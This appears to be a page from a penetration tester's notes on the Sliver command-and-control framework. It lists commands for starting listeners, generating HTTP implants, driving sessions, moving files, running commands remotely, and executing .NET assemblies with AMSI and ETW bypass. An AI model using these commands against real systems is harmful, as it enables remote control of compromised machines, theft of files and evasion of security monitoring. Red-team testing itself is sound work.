---
title: Sliver C2
source_url: https://notes.incendium.rocks/pentesting-notes/windows-pentesting/tools/sliver-c2
fetched_at: 2026-09-20T01:23:21Z
license: unspecified
category: windows
---
Sliver is an open source cross-platform adversary emulation/red team framework, it can be used by organizations of all sizes to perform security testing. (Not only for Windows)

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2Fjeoi9BzYr3GLgIq6ZKlT%2Fimage.png?alt=media&amp;token=1f8d803a-3a91-4662-acff-2049d0e766bd" alt=""><figcaption></figcaption></figure>

## Setup

```bash
# Start Sliver service
sudo systemctl start sliver

# Start Sliver server
sliver

# Start listening job on http(s)
http
https

# Generate implant for https / http
generate --http <my_host>
```

## General Commands

```bash
# List sessions
sessions

# Use session
use <session_id>

# Rename session
rename <name>

# Download / Upload
download <path-remote-file>
upload <path-local-file>

# Execute command and see output
execute -o <program> <arguments>
```

## Windows commands

```bash
# Execute assembly in same process + bypass AMSI and ETW (only .NET)
execute-assembly -i -M -E /path/to/local/file.exe <arguments>

# Side load executable to process
sideload /path/to/local/file.exe <arguments>
```
